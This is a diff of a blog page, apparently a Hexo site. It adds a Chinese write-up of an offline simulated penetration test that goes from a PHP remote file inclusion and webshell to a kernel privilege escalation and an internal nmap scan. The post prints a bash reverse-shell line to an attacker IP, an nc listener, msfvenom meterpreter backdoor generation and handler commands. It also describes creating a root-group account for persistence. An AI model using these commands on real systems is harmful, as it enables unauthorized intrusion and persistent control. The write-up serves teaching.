@@ -65,6 +65,53 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-模拟环境的渗透测试" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/25/模拟环境的渗透测试/" class="article-date">
+  <time datetime="2019-03-25T11:58:51.000Z" itemprop="datePublished">2019-03-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/25/模拟环境的渗透测试/">模拟环境的渗透测试</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　近期在整理以前的资料的时候，发现了去年做的某线下渗透测试的记录，这次渗透测试也比较契合实际环境中的渗透测试，所以我打算还是分享上来一来给自己复习一遍，二来也希望能给大家一点点渗透测试的思路。<br>　当开始做这次模拟的渗透测试的时候，只得到了一个信息，就是目标网站的域名。然后也没有告诉我们渗透到什么阶段才算结束了本次渗透。所以当时做的时候还比较懵逼<br>　这一点其实和我们做真实的渗透测试很像，当我们在做实际环境的渗透测试的时候，我们肯定也会有面临这样的情况，当目标只有一个域名，我们应该怎么做？那么其实按照一般的渗透测试步骤来说呢，总结起来就是寻找WEB服务的漏洞，尝试上传WEBSHELL，提权，内网嗅探，端口转发，内网渗透。然后再考虑权限的持久化等问题。等这一系列工作做完以后基本也就完成了一次较为完整的渗透测试。<br>　当然渗透测试也是需要根据具体情况来定的，渗透的步骤不是一成不变的。要根据具体环境具体情况来进行相应的调整。  </p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>　废话说了一大堆，也不耽误时间了，我现在开始把这次渗透测试的过程给贴出来吧，由于时间过了很久了，并且当时时间也比较紧，有些步骤就没有进行截图。所以大家将就看看。了解个思路就是了。<br>　为了方便大家理解，我先把拓扑图给贴出来，当然这拓扑图是后来渗透做完后自己做的一个简单的拓扑。<br><img src="/2019/03/25/模拟环境的渗透测试/拓扑图.png" alt=""><br>　1.我们目前能访问的就只有192.168.5.10这个网站,这个网站是一家公司主页，经过系列浏览与探索，知道该网站使用的是PHP,并且发现了一处类似文件包含的页面。如图：<br><img src="/2019/03/25/模拟环境的渗透测试/5.10.png" alt=""><br>　看到这里应该，第一个能想到的就是包含漏洞，而文件包含漏洞也分为本地文件包含于远程文件包含，如果是本地文件包含漏洞的话，我们可以利用它读取服务器上的文件，尝试读取源码，或者找到上传点再去包含webshell文件。而如果是远程文件包含的话就更方便了，可以直接尝试包含webshell。不过要注意的是远程文件包含不能包含以PHP为后缀的文件。<br>　在这里我使用了PHP的伪协议进行测试，发现确实是存在漏洞，如果已经能执行命令了，那么代表其一定能够远程文件包含。<br><img src="/2019/03/25/模拟环境的渗透测试/info.png" alt=""><br>　远程文件包含，我相信大家也都知道怎么去运用，由于本次的渗透是线下的，并且不通外网，我们直接在本地搭建HTTP服务，将我们的WEBSHELL放进去，并在目标站点包含我们这个shell文件就可以了，不过要注意，一定不能是PHP后缀。<br>　这里我在shell中添加了PHPinfo方便判断是否包含成功。可以看到是成功包含了的。<br><img src="/2019/03/25/模拟环境的渗透测试/shell.png" alt=""><br>　然后就是大家熟悉的东西了，上菜刀。ＨＨＨ<br><img src="/2019/03/25/模拟环境的渗透测试/菜刀.png" alt=""><br>　尝试是否能执行命令，查看权限。<br><img src="/2019/03/25/模拟环境的渗透测试/whoami.png" alt=""><br>　可以看到是一个低权限用户。那么先考虑进行提权，根据系统内核寻找exp进行提权。<br><img src="/2019/03/25/模拟环境的渗透测试/uname.png" alt=""><br>　由于我当时用的EXP提权的话，需要有交互，而菜刀并不能提供交互式的shell，所以我当时使用NC监听并进行端口转发。不过当时并未截图，我将方法写出来吧。<br>目标端：/bin/bash/ -i &gt; /dev/tcp/192/168.5.107/7777 0&lt;&amp;1 2&gt;&amp;1<br>攻击端：nc -lvnp 7777<br>也就是将bash转发到我们的7777端口，并监听建立连接。<br>　如图，已经将我们的权限提升为ROOT,不过需要注意的是，这个提权只是提升了bash的权限，为了方便后续渗透，我们需要创建一个属于root组的用户。创建账户我也就没有截图了。<br><img src="/2019/03/25/模拟环境的渗透测试/EXP.png" alt=""><br>　登录ssh,可以看到我们是root组的用户。（这里强烈推荐一下MobaXterm这个终端管理工具，巨好用。）<br><img src="/2019/03/25/模拟环境的渗透测试/xshell.png" alt=""><br>　做到这里，我们来梳理一下，我们目前已经上传了shell并且得到了root权限。那么就应该考虑一下内网渗透了，那么做内网渗透就不的不提MSF了吧。为了方便我们后续的内网渗透能顺利开展，我们先使用MSF生成一个后门，并执行它。<br>　生成后门（如果对方机器有杀软可以添加编码等尝试绕过，这里目标机没有我也就没做了。）PS 没有截图 =。=<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.5.107 LPORT=4444 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure></p>
+<p>　在msf中启动监听。  </p>
+<pre><code>　use exploit/multi/handler  
+　set PAYLOAD linux/x86/meterpreter/reverse_tcp  
+　set LHOST 0.0.0.0  
+　exploit   
+</code></pre><p>　然后在目标服务器上运行我们的后门。<br>　可以看到msf的控制台中已经将shell反弹回来。<br><img src="/2019/03/25/模拟环境的渗透测试/msf.png" alt=""><br>　当时使用msf的时候，遇到了个坑，本来是打算使用msf做内网渗透的，而由于当时们整个测试地点都处于内网，不能连通外网，并且我的msf并没有下载NMAP模块=。=，所以导致我后续的渗透都没使用msf平台了。不过在实际环境中并不会有影响，使用msf的话，可以极大的提高我们的效率。<br>　于是转变了下思路，将我的nmap源码上传到5.10这个边界服务器上，进行编译，然后扫描。PS（实际环境中这样不可取，及容易触发安全机制。）扫描情况如下所示（有路由，有FTP服务器，有2台服务器web服务，还有ssh,3389等。）<br><img src="/2019/03/25/模拟环境的渗透测试/nmap1.png" alt=""><br><img src="/2019/03/25/模拟环境的渗透测试/nmap2.png" alt=""><br><img src="/2019/03/25/模拟环境的渗透测试/nmap3.png" alt="">  </p>
+<p>　</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://holdontoyourheart.github.io/2019/03/25/模拟环境的渗透测试/" data-id="cjtofiojh0009nwjiureynrs2" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Nessus报告汉化篇二" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/01/02/Nessus报告汉化篇二/" class="article-date">
@@ -94,7 +141,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2019/01/02/Nessus报告汉化篇二/" data-id="cjqvzlukg00020sjir0syalsa" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2019/01/02/Nessus报告汉化篇二/" data-id="cjtofioi70001nwjik9s6vuio" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
@@ -135,7 +182,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/Nessus报告汉化篇/" data-id="cjqvzluk100000sji0upjs8f7" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/Nessus报告汉化篇/" data-id="cjtofioh60000nwji3i11snyv" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
@@ -173,7 +220,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/WEB安全/" data-id="cjqvzluko00040sji3q7iwvx3" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/WEB安全/" data-id="cjtofioil0003nwjio6lss5ew" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
@@ -216,7 +263,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/个人简介/" data-id="cjqvzlukq00050sji4fl2ho61" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/个人简介/" data-id="cjtofioiy0004nwjim7xaapf3" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂记/">杂记</a></li></ul>
@@ -263,7 +310,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/11/02/hello-world/" data-id="cjqvzluku00060sjiavff403t" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/11/02/hello-world/" data-id="cjtofioj10005nwjic4b5b2uq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -303,7 +350,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/安全/" style="font-size: 10px;">安全</a> <a href="/tags/杂记/" style="font-size: 10px;">杂记</a>
+      <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/安全/" style="font-size: 20px;">安全</a> <a href="/tags/杂记/" style="font-size: 10px;">杂记</a>
     </div>
   </div>
 
@@ -312,7 +359,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
     </div>
   </div>
 
@@ -323,6 +370,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/03/25/模拟环境的渗透测试/">模拟环境的渗透测试</a>
+          </li>
         
           <li>
             <a href="/2019/01/02/Nessus报告汉化篇二/">Nessus报告汉化篇二(初步汉化)</a>
@@ -338,10 +389,6 @@
         
           <li>
             <a href="/2018/12/28/个人简介/">自介</a>
-          </li>
-        
-          <li>
-            <a href="/2018/11/02/hello-world/">Hello World</a>
           </li>
         
       </ul>
